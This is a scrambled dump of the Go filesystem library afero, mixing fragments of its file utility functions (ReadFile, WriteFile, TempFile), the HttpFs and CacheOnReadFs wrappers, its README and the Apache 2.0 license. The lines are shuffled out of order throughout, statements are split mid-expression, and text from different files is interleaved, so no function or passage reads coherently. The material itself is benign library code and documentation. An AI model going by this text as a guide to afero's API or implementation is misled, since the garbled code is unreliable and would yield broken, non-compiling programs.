"func (a Afero) WriteFile(filename string, data []byte, perm os.FileMode) error {"
"// and writing, and returns the resulting "
"try := filepath.Join(dir, prefix"
rand = reseed()
"// defined to read from src until EOF, it does not treat an EOF from Read"
"list, err := f.Readdir(-1)"
var rand uint32
"return ReadDir(a.Fs, dirname)"
 int64(os.Getpid()))
// TempDir creates a new temporary directory in the directory dir
"""bytes"""
2015 The Go Authors
// call will read into its allocated internal buffer cheaply.  If the size was
"f, err := fs.OpenFile(filename, os.O_WRONLY"
 r%1e9))[1:]
if err == nil 
"// Don't preallocate a huge buffer, just in case."
// ReadAll reads from r until an error or EOF and returns the data it read.
"""strconv"""
"func (a Afero) ReadDir(dirname string) ([]os.FileInfo, error) {"
//     http://www.apache.org/licenses/LICENSE-2.0
// you may not use this file except in compliance with the License.
err = err1
nextSuffix())
var n int64
"func (a Afero) TempFile(dir, prefix string) (f File, err error) {"
// Multiple programs calling TempFile simultaneously
 ok 
"return readAll(f, n"
2015 Steve Francia <spf@spf13.com>
// to remove the file when no longer needed.
"return list, nil"
"if panicErr, ok := e.(error)"
"// A successful call returns err == nil, not err == EOF. Because ReadAll is"
// TempFile to a minimum.
nconflict := 0
"// new directory.  If dir is the empty string, TempDir uses the"
// WriteFile writes data to a file named by filename.
// a list of sorted directory entries.
"buf := bytes.NewBuffer(make([]byte, 0, capacity))"
"func WriteFile(fs Fs, filename string, data []byte, perm os.FileMode) error {"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"func (a Afero) TempDir(dir, prefix string) (name string, err error) {"
"f, err := fs.Open(filename)"
"// read, so let's try it but be prepared for the answer to be wrong."
"return readAll(r, bytes.MinRead)"
"f, err = fs.OpenFile(name, os.O_RDWR"
var randmu sync.Mutex
r := rand
continue
"// Unless required by applicable law or agreed to in writing, software"
// ReadFile reads the file named by filename and returns the contents.
// and to avoid another allocation after Read has filled the buffer.  The readAll
// as an error to be reported.
"func (a Afero) ReadFile(filename string) ([]byte, error) {"
// We generate random temporary file names so that there's a good
e := recover()
return err
} else {
// readAll reads from r until an error or EOF and returns the data it read
"name := filepath.Join(dir, prefix"
// You may obtain a copy of the License at
 size < 1e9 {
// to remove the directory when no longer needed.
break
if e == nil {
if err != nil {
r = reseed()
" a little extra in case Size is zero,"
"// If the file does not exist, WriteFile creates it with permissions perm"
1664525 
// limitations under the License.
// to be reported.
"if dir == """" {"
func nextSuffix() string {
 i < 10000
import (
package afero
randmu.Unlock()
 nconflict > 10 {
"func ReadFile(fs Fs, filename string) ([]byte, error) {"
 1013904223 // constants from Numerical Recipes
panic(e)
// Copyright 
// ReadDir reads the directory named by dirname and returns
"func readAll(r io.Reader, capacity int64) (b []byte, err error) {"
// Multiple programs calling TempDir simultaneously
"// with a name beginning with prefix, opens the file for reading"
err = io.ErrShortWrite
bytes.MinRead)
"return WriteFile(a.Fs, filename, data, perm)"
for i := 0
defer func() {
err = panicErr
// TempFile creates a new temporary file in the directory dir
randmu.Lock()
// in the overwhelmingly common case we'll get it just right.
"func ReadDir(fs Fs, dirname string) ([]os.FileInfo, error) {"
// Return that as an error. Any other panic remains.
 n < len(data) {
rand = r
defer f.Close()
File.
"if fi, err := f.Stat()"
// with a name beginning with prefix and returns the path of the
// to find the pathname of the file.  It is the caller's responsibility
// default directory for temporary files (see os.TempDir).
"""time"""
sort.Sort(byName(list))
"// A successful call returns err == nil, not err == EOF. Because ReadFile"
"os.O_EXCL, 0600)"
"func TempDir(fs Fs, dir, prefix string) (name string, err error) {"
// It's a good but not certain bet that FileInfo will tell us exactly how much to
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
// chance the file doesn't exist yet - keeps the number of tries in
// will not choose the same directory.  It is the caller's responsibility
"return nil, err"
"return buf.Bytes(), err"
if err1 := f.Close()
// Random number state.
"err = fs.Mkdir(try, 0700)"
name = try
"return ReadFile(a.Fs, filename)"
// will not choose the same file.  The caller can use f.Name()
"f, err := fs.Open(dirname)"
// byName implements sort.Interface.
n = size
"// If the buffer overflows, we will get bytes.ErrTooLarge."
"// wrong, we'll either waste some space off the end or reallocate as needed, but"
// See the License for the specific language governing permissions and
if nconflict
"_, err = buf.ReadFrom(r)"
// for temporary files (see os.TempDir).
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
return uint32(time.Now().UnixNano() 
if size := fi.Size()
 err == nil {
"""io"""
"func (f byName) Swap(i, j int)      { f[i], f[j] = f[j], f[i] }"
"// As initial capacity for readAll, use n "
"// If dir is the empty string, TempFile uses the default directory"
"// reads the whole file, it does not treat an EOF from Read as an error"
"""sync"""
"func TempFile(fs Fs, dir, prefix string) (f File, err error) {"
func reseed() uint32 {
"os.O_TRUNC, perm)"
"func (f byName) Less(i, j int) bool { return f[i].Name() < f[j].Name() }"
return
func (f byName) Len() int           { return len(f) }
r = r
os.O_CREATE
return strconv.Itoa(int(1e9 
"""sort"""
// otherwise WriteFile truncates it before writing.
"return TempFile(a.Fs, dir, prefix)"
type byName []os.FileInfo
f.Close()
if os.IsExist(err) {
// from the internal buffer allocated with a specified capacity.
"n, err := f.Write(data)"
// limitations under the License.
// Copyright 
// You may obtain a copy of the License at
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"// Unless required by applicable law or agreed to in writing, software"
// you may not use this file except in compliance with the License.
import (
 2016 Steve Francia <spf@spf13.com>.
"""syscall"""
// See the License for the specific language governing permissions and
package afero
// http://www.apache.org/licenses/LICENSE-2.0
const BADFD = syscall.EBADF
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
build darwin openbsd freebsd netbsd dragonfly
      meet the following conditions:
 within the Source form or
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      incidental, or consequential damages of any character arising as a"
"          that You distribute, all copyright, patent, trademark, and"
          the Derivative Works
"      communication on electronic mailing lists, source code control systems,"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      for any such Derivative Works as a whole, provided Your use,"
"      reproduction, and distribution of the Work otherwise complies with"
   2. Grant of Copyright License. Subject to the terms and conditions of
"          or as an addendum to the NOTICE text from the Work, provided"
   4. Redistribution. You may reproduce and distribute copies of the
      may provide additional or different license terms and conditions
      or by an individual or Legal Entity authorized to submit on behalf of
      as of the date such litigation is filed.
"      or contributory patent infringement, then any patent licenses"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
      Contribution(s) alone or by combination of their Contribution(s)
      or other liability obligations and/or rights consistent with this
"      designated in writing by the copyright owner as ""Not a Contribution."""
      subsequently incorporated within the Work.
      with Licensor regarding such Contributions.
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      excluding communication that is conspicuously marked or otherwise
"          documentation, if provided along with the Derivative Works"
"      names, trademarks, service marks, or product names of the Licensor,"
      (a) You must give any other recipients of the Work or
"      means any form of electronic, verbal, or written communication sent"
"                           Version 2.0, January 2004"
"      copyright license to reproduce, prepare Derivative Works of,"
      origin of the Work and reproducing the content of the NOTICE file.
"   8. Limitation of Liability. In no event and under no legal theory,"
"      (c) You must retain, in the Source form of any Derivative Works"
          do not modify the License. You may add Your own attribution
"      other entities that control, are controlled by, or are under common"
"          notices within Derivative Works that You distribute, alongside"
"      transformation or translation of a Source form, including but"
          that such additional attribution notices cannot be construed
"      incurred by, or claims asserted against, such Contributor by reason"
"      Licensor for the purpose of discussing and improving the Work, but"
"      (except as stated in this section) patent license to make, have made,"
   9. Accepting Warranty or Additional Liability. While redistributing
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
          include a readable copy of the attribution notices contained
"      of any other Contributor, and only if You agree to indemnify,"
      and distribution as defined by Sections 1 through 9 of this document.
 and
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
      Work and such Derivative Works in Source or Object form.
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      of this License, Derivative Works shall not include works that remain"
"      direction or management of such entity, whether by contract or"
"      whether in tort (including negligence), contract, or otherwise,"
      appropriateness of using or redistributing the Work and assume any
"      ""Contribution"" shall mean any work of authorship, including"
      and conversions to other media types.
"      agreed to in writing, Licensor provides the Work (and each"
"      publicly display, publicly perform, sublicense, and distribute the"
      institute patent litigation against any entity (including a
          excluding those notices that do not pertain to any part of
      by You to the Licensor shall be under the terms and conditions of
"      represent, as a whole, an original work of authorship. For the purposes"
      or a Contribution incorporated within the Work constitutes direct
"      source, and configuration files."
"      to the Licensor or its representatives, including but not limited to"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"      ""Work"" shall mean the work of authorship, whether in Source or"
      where such license applies only to those patent claims licensable
"      ""Legal Entity"" shall mean the union of the acting entity and all"
      (b) You must cause any modified files to carry prominent notices
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      Work or Derivative Works thereof in any medium, with or without"
          of the NOTICE file are for informational purposes only and
"      for use, reproduction, or distribution of Your modifications, or"
          Derivative Works a copy of this License
"          within a display generated by the Derivative Works, if and"
          as modifying the License.
          wherever such third-party notices normally appear. The contents
      (an example is provided in the Appendix below).
      unless required by applicable law (such as deliberate and grossly
   1. Definitions.
"      to that Work or Derivative Works thereof, that is intentionally"
      submitted to Licensor for inclusion in the Work by the copyright owner
"      including but not limited to software source code, documentation"
"      outstanding shares, or (iii) beneficial ownership of such entity."
      with the Work to which such Contribution(s) was submitted. If You
      the terms of any separate license agreement you may have executed
          as part of the Derivative Works
"      liable to You for damages, including any direct, indirect, special,"
      on behalf of whom a Contribution has been received by Licensor and
"      the Work or Derivative Works thereof, You may choose to offer,"
"      implied, including, without limitation, any warranties or conditions"
      of your accepting any such warranty or additional liability.
"      Object form, made available under the License, as indicated by a"
"          pertain to any part of the Derivative Works, in at least one"
                        http://www.apache.org/licenses/
      the Work and Derivative Works thereof.
"          distribution, then any Derivative Works that You distribute must"
      except as required for reasonable and customary use in describing the
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
      You may add Your own copyright statement to Your modifications and
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
          of the following places: within a NOTICE text file distributed
"      control with that entity. For the purposes of this definition,"
"      Work (including but not limited to damages for loss of goodwill,"
"      ""control"" means (i) the power, direct or indirect, to cause the"
      has been advised of the possibility of such damages.
      copyright notice that is included in or attached to the work
"      this License, each Contributor hereby grants to You a perpetual,"
      by such Contributor that are necessarily infringed by their
"          within such NOTICE file, excluding those notices that do not"
      the conditions stated in this License.
   6. Trademarks. This License does not grant permission to use the trade
"      work stoppage, computer failure or malfunction, or any and all"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      other commercial damages or losses), even if such Contributor"
"      modifications, and in Source or Object form, provided that You"
   7. Disclaimer of Warranty. Unless required by applicable law or
"      this License, without any additional terms or conditions."
"      editorial revisions, annotations, elaborations, or other modifications"
"      ""Source"" form shall mean the preferred form for making modifications,"
      any Contribution intentionally submitted for inclusion in the Work
      risks associated with Your exercise of permissions under this License.
"      not limited to compiled object code, generated documentation,"
      result of this License or out of the use or inability to use the
"      defend, and hold each Contributor harmless for any liability"
      the copyright owner that is granting the License.
          stating that You changed the files
                                Apache License
"          attribution notices from the Source form of the Work,"
"      and issue tracking systems that are managed by, or on behalf of, the"
      granted to You under this License for that Work shall terminate
" or,"
"      License. However, in accepting such obligations, You may act only"
      the original version of the Work and any modifications or additions
   3. Grant of Patent License. Subject to the terms and conditions of
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      negligent acts) or agreed to in writing, shall any Contributor be"
"      ""Object"" form shall mean any form resulting from mechanical"
      PARTICULAR PURPOSE. You are solely responsible for determining the
      exercising permissions granted by this License.
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      form, that is based on (or derived from) the Work and for which the"
"      separable from, or merely link (or bind by name) to the interfaces of,"
// limitations under the License.
"return h.source.Chtimes(name, atime, mtime)"
"if dir == """" {"
"""path/filepath"""
"return nil, err"
"func (h HttpFs) Chtimes(name string, atime time.Time, mtime time.Time) error {"
return h.source.RemoveAll(path)
import (
"""path"""
if filepath.Separator != '/' 
package afero
"x00"") {"
 2014 Steve Francia <spf@spf13.com>.
if err == nil {
func (h HttpFs) Remove(name string) error {
"func (h HttpFs) Stat(name string) (os.FileInfo, error) {"
"func (h HttpFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
"func (h HttpFs) Create(name string) (File, error) {"
"return nil, errors.New(""http: invalid character in file path"")"
HttpFs {
func (h HttpFs) RemoveAll(path string) error {
func (h HttpFs) Dir(s string) 
// Copyright 
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
HttpFs{source: source}
"dir = ""."""
"strings.Contains(name, """
"func (h HttpFs) Chmod(name string, mode os.FileMode) error {"
"""os"""
dir := string(d.basePath)
"return h.source.MkdirAll(path, perm)"
// See the License for the specific language governing permissions and
"f, err := d.fs.Open(filepath.Join(dir, filepath.FromSlash(path.Clean(""/"""
return h.source.Stat(name)
// http://www.apache.org/licenses/LICENSE-2.0
"func (h HttpFs) Open(name string) (http.File, error) {"
"func (d httpDir) Open(name string) (http.File, error) {"
"return f, nil"
"return h.source.Mkdir(name, perm)"
"return h.source.Chmod(name, mode)"
"return h.source.OpenFile(name, flag, perm)"
return h.source.Create(name)
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
name))))
"if httpfile, ok := f.(http.File)"
"func (h HttpFs) Rename(oldname, newname string) error {"
"// Unless required by applicable law or agreed to in writing, software"
httpDir {
"return httpfile, nil"
type HttpFs struct {
" strings.IndexRune(name, filepath.Separator) >= 0 "
"func (h HttpFs) Mkdir(name string, perm os.FileMode) error {"
source Fs
func NewHttpFs(source Fs) 
"func (h HttpFs) Name() string { return ""h HttpFs"" }"
"httpDir{basePath: s, fs: h}"
// You may obtain a copy of the License at
type httpDir struct {
"f, err := h.source.Open(name)"
// you may not use this file except in compliance with the License.
"""errors"""
"func (h HttpFs) MkdirAll(path string, perm os.FileMode) error {"
"""time"""
if err != nil {
"return h.source.Rename(oldname, newname)"
return 
basePath string
"""net/http"""
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
"""strings"""
fs       HttpFs
return h.source.Remove(name)
 ok {
"WriteReader(path string, r io.Reader) (err error)"
overlay layer before modification (including opening a file with a writable
1. Fork it
"Read operations will first look in the overlay and if not found there, will"
can set it to afero.NewMemMapFs().
GetTempDir(subPath string) string
We would replace it with:
Any Afero FileSystem can be used as an httpFs.
 CopyOnWriteFs()
"ReadDir(dirname string) ([]os.FileInfo, error)"
Directories are not filtered.
 Step 1: Install Afero
appFS := afero.NewMemMapFs()
Afero is easy to use and easier to adopt.
 MemMapFs.Remove now really deletes the file
[![Build Status](https://travis-ci.org/spf13/afero.svg)](https://travis-ci.org/spf13/afero) [![Build status](https://ci.appveyor.com/api/projects/status/github/spf13/afero
Afero provides an httpFs file system which satisfies this requirement.
" is a form of the root ""faci"
 Using Afero
 ioutil with some developed for Hugo.
It is suitable for use in a any situation where you would consider using the OS
"FileContainsBytes(filename string, subslice []byte) (bool, error)"
 CacheOnReadFs
    $ go get github.com/spf13/afero
"done first to the base, then to the overlay layer. Write calls to open file"
 RegexpFs
svg=true)](https://ci.appveyor.com/project/spf13/afero) [![GoDoc](https://godoc.org/github.com/spf13/afero
"Stat(name string) : os.FileInfo, error"
calls. It also makes it trivial to have your code use the OS during
They are available under two different approaches to use. You can either call
git checkout -b my-new-feature
 Walk and ReadDir have changed parameter order
 [jaqx0r](https://github.com/jaqx0r)
"Afero provides significant improvements over using the os package alone, most"
5. Create new Pull Request
safely.
 Release Notes
 Operating System Native
"appFS.MkdirAll(""src/a"", 0755)"
 TAR
 Use Afero for mock filesystems while testing
 Available Backends
io.ReaderAt
Truncate()
filesystems that make it easy to work with afero while retaining all the power
utm_campaign=pr-badge
 hugo to be afero aware
 OsFs
"f, err := afero.TempFile(fs,"""", ""ioutil-test"")"
3. Commit your changes (
"Readdirnames(n int) : []string, error"
"The English word that shares the same roots as Afero is ""affair"". Affair shares"
Files not matching the regexp provided will not be created.
fileserver := http.FileServer(httpFs.Dir(<PATH>)))
0.9.0
Write()
"Cache files in the layer for the given time.Duration, a cache duration of 0"
base := afero.NewOsFs()
fs := afero.NewReadOnlyFs(afero.NewOsFs())
 InMemoryFile.Readdir and Readdirnames work correctly
", a custom type used to bind these"
afero.Afero{Fs: fs}
 [xor-gate](https://github.com/xor-gate)
"fh, _ = ufs.Create(""/home/test/file2.txt"")"
 License
So if my application before had:
filesystem for full interoperability.
 to the overlay first.
RemoveAll(path string) : error
 Use the interfaces alone to define you own file system.
""" does not exist."
"Chtimes(name string, atime time.Time, mtime time.Time) : error"
 Step 3: Use it like you would the OS package
"ReadFile(filename string) ([]byte, error)"
"Readdir(count int) : []os.FileInfo, error"
from the base to the overlay when they're not present (or outdated) in the
"fs := afero.NewRegexpFs(afero.NewMemMapFs(), regexp.MustCompile("
"name := ""src/c"""
types and methods. Afero has an exceptionally clean interface and simple design
"It's also nice that unlike some of my other libraries (hugo, cobra, viper) it"
 Interoperation between a variety of file system types
Next include Afero in your application.
httpFs := afero.NewHttpFs(<ExistingFS>)
 InMemoryFile
 OsFs passes the majority of the OS test suite
system using InMemoryFile.
File Interfaces and Methods Available:
reproducible regardless of OS. You could create files to your heart
A read-only base will make the overlay also read-only but still copy files
for a library that allows one to make files and directories and do things with them.
"_, err := fs.Create(""/file.html"")"
"TempDir(dir, prefix string) (name string, err error)"
 General bugfixes and improvements
 SftpFs
via the union Fs).
s content
"afero.WriteFile(appFS, ""src/c"", []byte(""file c""), 0644)"
"Open(name string) : File, error"
File System Methods Available:
 SSH
them directly where the first parameter of each function will be the file
Removing and Renaming files present only in the base layer is not currently
In some applications it may make sense to define a new package that
"_, err := fs.Create(""/file.txt"")"
directly permitting the request is within the cache duration of when it was
A FileSystem Abstraction System for Go
appropriate in my application code. This approach ensures that Tests are order
0.10.0
 MemMapFs passes the majority of the OS test suite
fh.Close()
![afero logo-sm](https://cloud.githubusercontent.com/assets/173412/11490338/d50e16dc-97a5-11e5-8b12-019a300d0fcb.png)
"means ""forever"" meaning the file will not be re-requested from the base ever."
"""Ad"""
"If the base filesystem is writeable, any changes to files will be"
"To writing files to the overlay only, you can use the overlay Fs directly (not"
io.Seeker
functions as methods to a given filesystem.
 Contributors
 Calling utilities directly
 Avoid security issues and permissions
necessary. It is fully concurrent and will work within go routines
Afero also provides a fully atomic memory backed filesystem perfect for use in
Any attempt to modify a file found only in the base will copy the file to the
There is a large benefit to using a mock filesystem for testing. It has a
"Create(name string) : File, error"
The afero utilities support all afero compatible backends.
// err = syscall.ENOENT
serve the file from the base.
 Test suite improvements
branch=master
 2014.10.28
 New Walk function similar to filepath.Walk
A few different ways you could use Afero:
"mm.MkdirAll(""src/a"", 0755))"
leaving the base filesystem (OsFs) untouched.
Name() : string
"Walk(root string, walkFn filepath.WalkFunc) error"
In your application this will be set to afero.NewOsFs() during testing you
io.Writer
 Full compatibility with Windows
 A single consistent API for accessing a variety of filesystems
"Afero is an filesystem framework providing a simple, uniform and universal API"
"WriteFile(filename string, data []byte, perm os.FileMode) error"
Remove(name string) : error
 somewhere
and the file access would be fast while also saving you from all the annoying
"Exists(path string) (bool, error)"
returns an http.File type.
First define a package variable and set it to a pointer to a filesystem.
The given file name to the operations on this Fs will be prepended with
[LICENSE.txt](https://github.com/spf13/afero/blob/master/LICENSE.txt)
implement:
 Memory Backed Storage
"n"", name)"
notably the ability to create mock and testing filesystems without relying on the disk.
"interacting with any filesystem, as an abstraction layer providing interfaces,"
afs := 
caching layer.
" Specialized backends which modify existing filesystems (Read Only, Regexp filtered)"
"IsDir(path string) (bool, error)"
"ufs := afero.NewCopyOnWriteFs(roBase, afero.NewMemMapFs())"
utm_content=badge)
 Afero Features
"OpenFile(name string, flag int, perm os.FileMode) : File, error"
utm_source=badge
git push origin my-new-feature
Afero is also a library providing a base set of interoperable backend
Afero
appfs := afero.NewOsFs()
Changes to the file system will only be made in the overlay.
"f, err := afs.TempFile("""", ""ioutil-test"")"
The list of utilities includes:
Afero provides a set of functions to make it easier to use the underlying file systems.
"MkdirAll(path string, perm os.FileMode) : error"
status.svg)](https://godoc.org/github.com/spf13/afero) [![Join the chat at https://gitter.im/spf13/afero](https://badges.gitter.im/Dev%20Chat.svg)](https://gitter.im/spf13/afero
 Interfaces feel ready for people to build using
"appfs.MkdirAll(""src/a"", 0755))"
file system.
created in the overlay.
It is important to note that if you repeat the composite literal you
io.Closer
 InMemoryFile functions lock it for concurrent access
 BasePathFs
"issues with deleting temporary files, Windows file locking, etc. The MemMapFs"
simply exports the file system variable for easy access from anywhere.
 MemMapFs
These functions have been primarily ported from io 
backends.
// create test files and directories
It wouldn't be uncommon to have each test initialize a blank slate memory
 Introduction of afero utilities
 Normalize paths for MemMapFs
Afero provides the ability have two filesystems (or more) act as a single
will be using a completely new and isolated filesystem. In the case of
appFS = afero.NewOsFs()
"independent, with no test relying on the state left by an earlier test."
2. Create your feature branch (
very easy to use as all of the calls are the same as the existing OS
 Using Afero's utility functions
"Chmod(name string, mode os.FileMode) : error"
"Mkdir(name string, perm os.FileMode) : error"
 Overview
Afero is released under the Apache 2.0 license. See
"ufs := afero.NewCacheOnReadFs(base, layer, 100 "
AppFs
git commit -am 'Add some feature'
 being the variable we defined above.
"""Facere"""
"The literal meaning of afero is ""to make"" or ""to do"" which seems very fitting"
 Step 2: Declare a backend
 About the project
"object of a particular type""."
 Composite Backends
writeable layer on top.
Breaking Change
 Wrap for the OS packages.
 or 
"TempFile(dir, prefix string) (f File, err error)"
 A set of interfaces to encourage and enforce interoperability between backends
"A filtered view on file names, any file NOT matching"
" A set of utility functions ported from io, ioutil "
be used to perform file operations over a encrypted channel.
 Define different filesystems for different parts of your application.
Sync() : error
memory backed file system during testing. It also adds support for the http
One way to accomplish this is to define a variable as mentioned above.
backend. To do this I would define my 
utm_medium=badge
handles like 
 Moving types used by MemMapFs to a subpackage
mm := afero.NewMemMapFs()
 ZIP
io.Reader
 [spf13](https://github.com/spf13)
" is a prefix meaning ""to""."
"IsEmpty(path string) (bool, error)"
operation and a mock filesystem during testing or as needed.
"http.Handle(""/"", fileserver)"
 Desired/possible backends
if os.IsNotExist(err) {
 Interfaces satisfy all known uses
The CacheOnReadFs will lazily make copies of any accessed files from the base
 No test cleanup needed
AppFs.Open('/tmp/foo')
testing.T) {
 HttpFs
"WriteString(s string) : ret int, err error"
fs := afero.NewMemMapFs()
Names in no particular order:
"Rename(oldname, newname string) : error"
 time.Second)
""" making ""make or do""."
 Adding Sync to the file interface
 Test setup is far more easier to do
A thin wrapper around the source Fs providing a read only view.
"As part of MemMapFs, Afero also provides an atomic, fully concurrent memory"
overlay will be removed/renamed.
Afero comes from the latin roots Ad-Facere.
"import ""github.com/spf13/afero"""
 Test suite rewritten to work cross platform
The Http package requires a slightly specific version of Open which
 [mbertschler](https://github.com/mbertschler)
The BasePathFs restricts all operations to a given path within an Fs.
 First public version
 An atomic cross platform memory backed file system
completely blank state every time it is initialized and can be easily
the passed regexp will be treated as non-existing.
func TestExist(t 
Then in my tests I would initialize a new MemMapFs for each test:
 2015.12.10
handle).
the ability to drop in other filesystems as desired.
 2015.11.05
"fh.WriteString(""This is a test"")"
4. Push to the branch (
"t.Errorf(""file "
backed file implementation. This can be used in other memory backed file
" MemMapFs.OpenFile handles O_CREATE, O_APPEND, O_TRUNC"
Truncate(size int64) : error
fs := new(afero.MemMapFs)
 Much faster than performing I/O operations on disk
0.8.0
"afero.WriteFile(appFS, ""src/a/b"", []byte(""file b""), 0644)"
The CopyOnWriteFs is a read only base file system with a potentially
"bp := afero.NewBasePathFs(afero.NewOsFs(), ""/base/path"")"
 Network Interfaces
First use go get to install the latest version of the library.
var AppFs = afero.NewOsFs()
"the same concept but as a noun it means ""something that is made or done"" or ""an"
"SafeWriteReader(path string, r io.Reader) (err error)"
 Filtering Backends
Afero provides an http compatible backend which can wrap any of the existing
"system, or you can declare a new "
would.
Googles very well.
The first is simply a wrapper around the native OS calls. This makes it
 ReadOnlyFs
layer into the overlay. Subsequent reads will be pulled from the overlay
 Support for compositional (union) file systems by combining multiple file systems acting as one
OsFs it will still use the same underlying filesystem but will reduce
The following is a short list of possible backends we hope someone will
 Calling via Afero
Throughout your application use any function and method like you normally
systems with ease. Plans are to add a radix tree memory stored file
For a complete list see [Afero's GoDoc](https://godoc.org/github.com/spf13/afero)
mocking and to speed up unnecessary disk io when persistence isn
 Contributing
backend is perfect for testing.
 Far more control. 'rm -rf /' with confidence
Afero has experimental support for secure file transfer protocol (sftp). Which can
os.Open('/tmp/foo')
roBase := afero.NewReadOnlyFs(base)
// err = syscall.EPERM
"_, err := appFS.Stat(name)"
package as it provides an additional abstraction that makes it easy to use a
and benefit of the os and ioutil packages.
"DirExists(path string) (bool, error)"
io.WriterAt
 Using Afero for Testing
"permitted. If a file is present in the base layer and the overlay, only the"
.txt$
layer := afero.NewMemMapFs()
In this example all write operations will only occur in memory (MemMapFs)
 What's in the name
var AppFs = afero.NewMemMapFs()
"Stat() : os.FileInfo, error"
the base path before calling the source Fs.
without needless constructors or initialization methods.
 List of all available functions
"CacheOnReadFs) MkdirAll(name string, perm os.FileMode) error {"
"st, _, err := u.cacheStatus(oldname)"
err = u.base.RemoveAll(name)
CacheOnReadFs) RemoveAll(name string) error {
if err == nil {
const (
"lfi, err := u.layer.OpenFile(name, flag, perm)"
if err := u.copyToLayer(oldname)
"CacheOnReadFs) Chmod(name string, mode os.FileMode) error {"
return u.layer.Open(name)
default:
"""os"""
return u.layer.Remove(name)
"CacheOnReadFs) Mkdir(name string, perm os.FileMode) error {"
"default: // cacheStale has base, cacheHit and cacheLocal the layer os.FileInfo"
case cacheLocal:
 then we have to
if err := u.copyToLayer(name)
CacheOnReadFs) Name() string {
"bfi, err = u.base.Stat(name)"
func (u 
if err == syscall.ENOENT 
"err = u.base.Chtimes(name, atime, mtime)"
type cacheState int
if lfi.ModTime().Add(u.cacheTime).Before(time.Now()) {
"// a file is in the layer, the base will never be read again for this file."
"lfh, err := u.layer.Create(name)"
"err = u.base.Rename(oldname, newname)"
"bfile, _ := u.base.Open(name)"
"lfi, err = u.layer.Stat(name)"
"return cacheHit, lfi, nil"
"UnionFile{Base: bfile, Layer: lfile}, nil"
"var lfi, bfi os.FileInfo"
type CacheOnReadFs struct {
"return u.layer.Chmod(name, mode)"
"// states: ""The underlying filesystem may truncate or round the values to a"
"// For cache times greater than 0, the modification time of a file is"
"CacheOnReadFs) Chtimes(name string, atime, mtime time.Time) error {"
"""syscall"""
base      Fs
"lfile, err := u.layer.Open(name)"
"// filter - Note: this will also make the overlay read-only, for writing files"
switch st {
return u.base.Stat(name)
 bfile == nil {
"st, fi, err := u.cacheStatus(name)"
case cacheStale:
"case cacheLocal, cacheHit:"
if err != nil 
return u.layer.RemoveAll(name)
(os.O_WRONLY
"bfi, err := u.base.OpenFile(name, flag, perm)"
"case cacheStale, cacheMiss:"
"return copyToLayer(u.base, u.layer, name)"
"err := u.base.MkdirAll(name, perm)"
"// less precise time unit."""
"CacheOnReadFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
 err != nil {
// remember if the file did not exist before
"err = u.base.Chmod(name, mode)"
return err
"// oops, see comment about OS_TRUNC above, should we remove"
"return ""CacheOnReadFs"""
"// present in the overlay - with cache time == 0 it may exist in the base,"
"CacheOnReadFs) Rename(oldname, newname string) error {"
// with cacheTime > 0 it exists in the base and is same age or newer in the
"// the dirs from cacheHit, cacheStale fall down here:"
"CacheOnReadFs) Stat(name string) (os.FileInfo, error) {"
if err != nil {
"return cacheMiss, nil, err"
os.O_TRUNC) != 0 {
"// system first. To prevent writing to the base Fs, wrap it in a read-only"
case cacheHit:
err = u.base.Remove(name)
import (
package afero
"return fi, nil"
if bfi.ModTime().After(lfi.ModTime()) {
"CacheOnReadFs{base: base, layer: layer, cacheTime: cacheTime}"
"UnionFile{Base: bfi, Layer: lfi}, nil"
// resolution of a second for timestamps... or as the godoc for os.Chtimes()
cacheMiss cacheState = iota
"return u.layer.OpenFile(name, flag, perm)"
"bfi, err := u.base.Stat(name)"
"bfh, err := u.base.Create(name)"
"// not present in the overlay, unknown if it exists in the base:"
"return u.layer.Chtimes(name, atime, mtime)"
"err := u.base.Mkdir(name, perm)"
layer     Fs
"CacheOnReadFs) Create(name string) (File, error) {"
syscall.O_RDWR
// This caching union will forward all write calls also to the base file
// going through this union
case cacheMiss:
"return u.layer.MkdirAll(name, perm)"
// overlay
"""time"""
"bfi.Close() // oops, what if O_TRUNC was set and file opening in the layer failed..."
"// in the overlay, use the overlay Fs directly, not via the union Fs."
cacheTime time.Duration
return 
CacheOnReadFs) copyToLayer(name string) error {
"return nil, err"
if u.cacheTime == 0 {
"UnionFile{Base: bfh, Layer: lfh}, nil"
"return u.layer.Rename(oldname, newname)"
if bfi.IsDir() {
os.O_APPEND
return u.base.Open(name)
"func NewCacheOnReadFs(base Fs, layer Fs, cacheTime time.Duration) Fs {"
"case cacheHit, cacheStale, cacheMiss:"
cacheHit
"st, _, err := u.cacheStatus(name)"
"CacheOnReadFs) Open(name string) (File, error) {"
cacheLocal
if flag
if !fi.IsDir() {
// checked. Note that a lot of file system implementations only allow a
"// If the cache duration is 0, cache time will be unlimited, i.e. once"
"CacheOnReadFs) cacheStatus(name string) (state cacheState, fi os.FileInfo, err error) {"
 os.IsNotExist(err) {
"return cacheLocal, lfi, nil"
